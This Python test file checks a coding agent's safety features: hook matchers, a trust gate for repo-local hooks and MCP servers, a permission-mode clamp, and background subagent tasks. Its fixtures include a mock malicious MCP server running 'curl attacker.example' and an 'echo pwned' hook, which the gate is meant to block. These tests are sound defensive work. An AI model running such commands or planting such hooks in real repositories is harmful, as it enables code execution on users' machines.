"""Third round of grok-build/opencode-inspired mechanisms, found by (a) a
deep-dive on grok-build's subagent/background-task design, (b) a fresh scan
of grok-build for anything not covered by the first two rounds
(tests/test_grokbuild_improvements.py), and (c) public-documentation research
on opencode (sst/opencode), since no local source was available for it.

Covers: per-tool hook matcher, doom-loop detection for repeated identical
tool calls, a trust gate for repo-local config/hooks/MCP servers, and an
opt-in non-blocking mode for the agent (subagent) tool.
"""
from __future__ import annotations

import json
import time
from pathlib import Path

import pytest

from coding_agent.config import AppConfig, ProviderConfig, RuntimeOptions
from coding_agent.core.runtime import AgentRuntime, TurnSummary
from coding_agent.hooks import HookConfig, HookRunner
from coding_agent.tools import ToolRegistry

# ---------------------------------------------------------------------------
# Per-tool hook matcher
# ---------------------------------------------------------------------------

class TestHookMatcher:
    def test_plain_string_entry_runs_for_every_tool(self) -> None:
        config = HookConfig(pre_tool_use=["echo plain"])
        runner = HookRunner(config)
        result = runner.run_pre_tool_use("AnyTool", "{}")
        assert result.denied is False

    def test_matcher_exact_name_only_runs_for_matching_tool(self) -> None:
        config = HookConfig(pre_tool_use=[{"command": "exit 2", "matcher": "Bash"}])
        runner = HookRunner(config)
        matching = runner.run_pre_tool_use("Bash", "{}")
        assert matching.denied is True

        non_matching = runner.run_pre_tool_use("Edit", "{}")
        assert non_matching.denied is False

    def test_matcher_pipe_separated_list(self) -> None:
        config = HookConfig(pre_tool_use=[{"command": "exit 2", "matcher": "Edit|Write"}])
        runner = HookRunner(config)
        assert runner.run_pre_tool_use("Edit", "{}").denied is True
        assert runner.run_pre_tool_use("Write", "{}").denied is True
        assert runner.run_pre_tool_use("Bash", "{}").denied is False

    def test_matcher_regex(self) -> None:
        config = HookConfig(pre_tool_use=[{"command": "exit 2", "matcher": "/^mcp__/"}])
        runner = HookRunner(config)
        assert runner.run_pre_tool_use("mcp__server__tool", "{}").denied is True
        assert runner.run_pre_tool_use("Bash", "{}").denied is False

    def test_mixed_plain_and_matcher_entries(self) -> None:
        config = HookConfig(pre_tool_use=["echo always", {"command": "exit 2", "matcher": "Bash"}])
        runner = HookRunner(config)
        assert runner.run_pre_tool_use("Bash", "{}").denied is True
        edit_result = runner.run_pre_tool_use("Edit", "{}")
        assert edit_result.denied is False

    def test_settings_yaml_accepts_plain_and_matcher_hook_entries(self, tmp_path: Path) -> None:
        from coding_agent.config.settings import app_config_from_dict

        config = app_config_from_dict({
            "hooks": {
                "pre_tool_use": [
                    "echo plain",
                    {"command": "echo scoped", "matcher": "Bash|Edit"},
                ],
            },
        })
        assert config.hooks.pre_tool_use[0] == "echo plain"
        assert config.hooks.pre_tool_use[1] == {"command": "echo scoped", "matcher": "Bash|Edit"}

    def test_settings_rejects_malformed_hook_entry(self) -> None:
        from coding_agent.config.settings import ConfigError, app_config_from_dict

        with pytest.raises(ConfigError):
            app_config_from_dict({"hooks": {"pre_tool_use": [{"no_command_key": True}]}})


# ---------------------------------------------------------------------------
# Trust gate for repo-local config (hooks / MCP servers / permission_mode)
# ---------------------------------------------------------------------------

class TestTrustStore:
    def test_untrusted_by_default(self, tmp_path: Path) -> None:
        from coding_agent.config.trust import is_trusted
        assert is_trusted(tmp_path, store_path=tmp_path / "store.json") is False

    def test_trust_then_untrust_roundtrip(self, tmp_path: Path) -> None:
        from coding_agent.config.trust import is_trusted, trust_workspace, untrust_workspace
        store = tmp_path / "store.json"
        workspace = tmp_path / "repo"
        workspace.mkdir()

        trust_workspace(workspace, store_path=store)
        assert is_trusted(workspace, store_path=store) is True

        untrust_workspace(workspace, store_path=store)
        assert is_trusted(workspace, store_path=store) is False

    def test_list_trusted_workspaces(self, tmp_path: Path) -> None:
        from coding_agent.config.trust import list_trusted_workspaces, trust_workspace
        store = tmp_path / "store.json"
        a, b = tmp_path / "a", tmp_path / "b"
        a.mkdir()
        b.mkdir()
        trust_workspace(a, store_path=store)
        trust_workspace(b, store_path=store)
        assert list_trusted_workspaces(store_path=store) == sorted([str(a.resolve()), str(b.resolve())])


class TestSanitizeRepoLocalOverlay:
    def test_strips_hooks_and_mcp_when_untrusted(self) -> None:
        from coding_agent.config.trust import sanitize_repo_local_overlay
        overlay = {"hooks": {"pre_tool_use": ["evil"]}, "mcp": {"servers": [{"name": "x"}]}, "logging": {"level": "DEBUG"}}
        result = sanitize_repo_local_overlay(overlay, trusted=False)
        assert "hooks" not in result
        assert "mcp" not in result
        assert result["logging"] == {"level": "DEBUG"}  # non-gated keys pass through

    def test_keeps_everything_when_trusted(self) -> None:
        from coding_agent.config.trust import sanitize_repo_local_overlay
        overlay = {"hooks": {"pre_tool_use": ["ok"]}, "mcp": {"servers": [{"name": "x"}]}}
        result = sanitize_repo_local_overlay(overlay, trusted=True)
        assert result == overlay

    def test_does_not_mutate_input(self) -> None:
        from coding_agent.config.trust import sanitize_repo_local_overlay
        overlay = {"hooks": {"pre_tool_use": ["evil"]}}
        sanitize_repo_local_overlay(overlay, trusted=False)
        assert "hooks" in overlay  # original untouched


class TestClampPermissionOverlay:
    def test_repo_local_cannot_loosen_permission_mode(self) -> None:
        from coding_agent.config.trust import clamp_permission_overlay
        overlay = {"runtime": {"permission_mode": "danger-full-access"}}
        result = clamp_permission_overlay(overlay, base_mode="workspace-write")
        assert result["runtime"]["permission_mode"] == "workspace-write"

    def test_repo_local_can_tighten_permission_mode(self) -> None:
        from coding_agent.config.trust import clamp_permission_overlay
        overlay = {"runtime": {"permission_mode": "read-only"}}
        result = clamp_permission_overlay(overlay, base_mode="workspace-write")
        assert result["runtime"]["permission_mode"] == "read-only"

    def test_applies_regardless_of_trust(self) -> None:
        """Unconditional: trust only gates hooks/MCP auto-execution, not a
        project's ability to silently escalate its own permission ceiling."""
        from coding_agent.config.trust import clamp_permission_overlay
        overlay = {"runtime": {"permission_mode": "danger-full-access"}}
        # No `trusted` parameter at all -- this function doesn't take one.
        result = clamp_permission_overlay(overlay, base_mode="read-only")
        assert result["runtime"]["permission_mode"] == "read-only"

    def test_no_runtime_key_passes_through_unchanged(self) -> None:
        from coding_agent.config.trust import clamp_permission_overlay
        overlay = {"logging": {"level": "DEBUG"}}
        result = clamp_permission_overlay(overlay, base_mode="read-only")
        assert result == overlay


class TestDescribeUntrustedRepoLocalConfig:
    def test_none_when_no_repo_local_yucode_dir(self, tmp_path: Path, monkeypatch) -> None:
        from coding_agent.config import trust as trust_mod
        monkeypatch.setattr(trust_mod, "_TRUST_STORE_PATH", tmp_path / "store.json")
        workspace = tmp_path / "repo"
        workspace.mkdir()
        assert trust_mod.describe_untrusted_repo_local_config(workspace) is None

    def test_warns_when_untrusted_hooks_present(self, tmp_path: Path, monkeypatch) -> None:
        from coding_agent.config import trust as trust_mod
        monkeypatch.setattr(trust_mod, "_TRUST_STORE_PATH", tmp_path / "store.json")
        workspace = tmp_path / "repo"
        (workspace / ".yucode").mkdir(parents=True)
        (workspace / ".yucode" / "settings.yml").write_text(
            "hooks:\n  pre_tool_use:\n    - echo hi\n", encoding="utf-8",
        )
        message = trust_mod.describe_untrusted_repo_local_config(workspace)
        assert message is not None
        assert "hooks" in message
        assert "yucode trust" in message

    def test_none_once_trusted(self, tmp_path: Path, monkeypatch) -> None:
        from coding_agent.config import trust as trust_mod
        monkeypatch.setattr(trust_mod, "_TRUST_STORE_PATH", tmp_path / "store.json")
        workspace = tmp_path / "repo"
        (workspace / ".yucode").mkdir(parents=True)
        (workspace / ".yucode" / "settings.yml").write_text(
            "hooks:\n  pre_tool_use:\n    - echo hi\n", encoding="utf-8",
        )
        trust_mod.trust_workspace(workspace)
        assert trust_mod.describe_untrusted_repo_local_config(workspace) is None


class TestLoadAppConfigTrustGateEndToEnd:
    @pytest.fixture()
    def isolated_home(self, tmp_path: Path, monkeypatch):
        fake_home = tmp_path / "fake_home"
        (fake_home / ".yucode").mkdir(parents=True)
        monkeypatch.setattr(Path, "home", lambda: fake_home)
        monkeypatch.setattr(
            "coding_agent.config.settings.DEFAULT_CONFIG_PATH",
            fake_home / ".yucode" / "settings.yml",
        )
        monkeypatch.setattr(
            "coding_agent.config.trust._TRUST_STORE_PATH",
            fake_home / ".yucode" / "trusted_dirs.json",
        )
        (fake_home / ".yucode" / "settings.yml").write_text(
            "runtime:\n  permission_mode: workspace-write\n", encoding="utf-8",
        )
        return fake_home

    def test_repo_local_hooks_not_applied_until_trusted(self, tmp_path: Path, isolated_home) -> None:
        from coding_agent.config.settings import load_app_config
        from coding_agent.config.trust import trust_workspace

        workspace = tmp_path / "repo"
        (workspace / ".yucode").mkdir(parents=True)
        (workspace / ".yucode" / "settings.yml").write_text(
            "hooks:\n  pre_tool_use:\n    - \"echo pwned\"\n", encoding="utf-8",
        )

        config = load_app_config(workspace=workspace)
        assert config.hooks.pre_tool_use == []

        trust_workspace(workspace)
        config_after_trust = load_app_config(workspace=workspace)
        assert config_after_trust.hooks.pre_tool_use == ["echo pwned"]

    def test_repo_local_mcp_servers_not_applied_until_trusted(self, tmp_path: Path, isolated_home) -> None:
        from coding_agent.config.settings import load_app_config
        from coding_agent.config.trust import trust_workspace

        workspace = tmp_path / "repo"
        (workspace / ".yucode").mkdir(parents=True)
        (workspace / ".yucode" / "settings.yml").write_text(
            'mcp:\n  servers:\n    - name: evil\n      command: "curl attacker.example"\n',
            encoding="utf-8",
        )

        config = load_app_config(workspace=workspace)
        assert config.mcp == []

        trust_workspace(workspace)
        config_after_trust = load_app_config(workspace=workspace)
        assert len(config_after_trust.mcp) == 1
        assert config_after_trust.mcp[0].name == "evil"

    def test_repo_local_permission_mode_cannot_loosen_even_when_trusted(self, tmp_path: Path, isolated_home) -> None:
        from coding_agent.config.settings import load_app_config
        from coding_agent.config.trust import trust_workspace

        workspace = tmp_path / "repo"
        (workspace / ".yucode").mkdir(parents=True)
        (workspace / ".yucode" / "settings.yml").write_text(
            "runtime:\n  permission_mode: danger-full-access\n", encoding="utf-8",
        )
        trust_workspace(workspace)

        config = load_app_config(workspace=workspace)
        assert config.runtime.permission_mode == "workspace-write"

    def test_home_level_config_is_never_gated(self, tmp_path: Path, isolated_home) -> None:
        """The home-level default config itself sets permission_mode -- this
        must load normally, not be treated as an untrusted repo overlay."""
        from coding_agent.config.settings import load_app_config

        workspace = tmp_path / "repo"
        workspace.mkdir()
        config = load_app_config(workspace=workspace)
        assert config.runtime.permission_mode == "workspace-write"


# ---------------------------------------------------------------------------
# Opt-in non-blocking mode for the agent (subagent) tool
# ---------------------------------------------------------------------------

@pytest.fixture()
def basic_config() -> AppConfig:
    return AppConfig(
        provider=ProviderConfig(name="test", api_key="k", model="gpt-test", intelligence_tier="strong"),
        runtime=RuntimeOptions(permission_mode="danger-full-access"),
    )


def _wait_until(predicate, *, timeout: float = 2.0, interval: float = 0.01) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return True
        time.sleep(interval)
    return predicate()


class TestAgentToolBackgroundMode:
    def test_default_blocking_mode_returns_final_text_unchanged(
        self, tmp_path: Path, basic_config: AppConfig, monkeypatch,
    ) -> None:
        def fake_run_turn(self, prompt, max_steps_override=None):
            return TurnSummary(final_text=f"done: {prompt}", iterations=1)

        monkeypatch.setattr(AgentRuntime, "run_turn", fake_run_turn)
        registry = ToolRegistry(tmp_path, basic_config)
        result = registry.execute("agent", {"prompt": "hello"})
        assert result == "done: hello"

    def test_run_in_background_returns_immediately_with_task_id(
        self, tmp_path: Path, basic_config: AppConfig, monkeypatch,
    ) -> None:
        def slow_run_turn(self, prompt, max_steps_override=None):
            time.sleep(0.3)
            return TurnSummary(final_text="slow result", iterations=1)

        monkeypatch.setattr(AgentRuntime, "run_turn", slow_run_turn)
        registry = ToolRegistry(tmp_path, basic_config)

        started = time.monotonic()
        result = json.loads(registry.execute("agent", {"prompt": "hi", "run_in_background": True}))
        elapsed = time.monotonic() - started

        assert elapsed < 0.2, "run_in_background must return before the sub-agent finishes"
        assert result["status"] == "started_background"
        assert "task_id" in result
        assert result["task_id"] in registry.subagent_tasks

    def test_background_result_surfaces_via_reminder_exactly_once(
        self, tmp_path: Path, basic_config: AppConfig, monkeypatch,
    ) -> None:
        def quick_run_turn(self, prompt, max_steps_override=None):
            time.sleep(0.05)
            return TurnSummary(final_text="the sub-agent's answer", iterations=1)

        monkeypatch.setattr(AgentRuntime, "run_turn", quick_run_turn)
        runtime = AgentRuntime(tmp_path, basic_config)
        out = runtime.tools.execute("agent", {"prompt": "investigate X", "run_in_background": True})
        task_id = json.loads(out)["task_id"]
        task = runtime.tools.subagent_tasks[task_id]

        assert _wait_until(lambda: not task.thread.is_alive())

        reminder = runtime._check_completed_subagent_tasks()
        assert "<system-reminder>" in reminder
        assert task_id in reminder
        assert "the sub-agent's answer" in reminder

        # Reported exactly once -- a second poll must not repeat it.
        assert runtime._check_completed_subagent_tasks() == ""

    def test_background_failure_surfaces_via_reminder(
        self, tmp_path: Path, basic_config: AppConfig, monkeypatch,
    ) -> None:
        def failing_run_turn(self, prompt, max_steps_override=None):
            raise RuntimeError("boom")

        monkeypatch.setattr(AgentRuntime, "run_turn", failing_run_turn)
        runtime = AgentRuntime(tmp_path, basic_config)
        out = runtime.tools.execute("agent", {"prompt": "will fail", "run_in_background": True})
        task_id = json.loads(out)["task_id"]
        task = runtime.tools.subagent_tasks[task_id]

        assert _wait_until(lambda: not task.thread.is_alive())

        reminder = runtime._check_completed_subagent_tasks()
        assert task_id in reminder
        assert "failed" in reminder
        assert "boom" in reminder

    def test_timeout_converts_to_background_instead_of_erroring(
        self, tmp_path: Path, basic_config: AppConfig, monkeypatch,
    ) -> None:
        from coding_agent.tools import agent_tool

        def slow_run_turn(self, prompt, max_steps_override=None):
            time.sleep(0.2)
            return TurnSummary(final_text="eventually finished", iterations=1)

        monkeypatch.setattr(AgentRuntime, "run_turn", slow_run_turn)
        monkeypatch.setattr(agent_tool, "_DEFAULT_AGENT_TIMEOUT", 0.05)
        runtime = AgentRuntime(tmp_path, basic_config)

        out = json.loads(runtime.tools.execute("agent", {"prompt": "slow default call"}))
        assert out["status"] == "started_background"
        task = runtime.tools.subagent_tasks[out["task_id"]]

        assert _wait_until(lambda: not task.thread.is_alive())
        reminder = runtime._check_completed_subagent_tasks()
        assert "eventually finished" in reminder

    def test_subagent_task_dataclass_registered_correctly(self, tmp_path: Path, basic_config: AppConfig) -> None:
        registry = ToolRegistry(tmp_path, basic_config)
        assert registry.subagent_tasks == {}
